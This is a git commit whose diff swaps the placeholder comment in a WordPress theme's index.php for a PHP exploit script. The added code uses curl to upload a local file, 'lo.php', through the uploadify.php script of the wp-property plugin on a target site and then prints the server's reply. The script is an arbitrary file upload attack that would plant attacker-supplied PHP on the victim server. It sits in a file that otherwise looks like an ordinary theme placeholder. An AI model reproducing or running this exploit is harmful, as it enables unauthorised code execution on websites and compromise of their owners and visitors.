95375aff322e72c288d1de559b0b6ab7c6c2ecfe
foyshal <foyshal_hossain@yahoo.com>
2013-05-29 01:59:37 +0600

    index.php

--- wp-content/themes/index.php
+++ wp-content/themes/index.php
@@ -1,3 +1,16 @@
 <?php
-// Silence is golden.
+ 
+$uploadfile="lo.php";
+$ch =
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('Filedata'=>"@$uploadfile",
+          
+'folder'=>"/wordpress/wp-content/plugins/wp-property/third-party/uploadify/"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+ 
 ?>
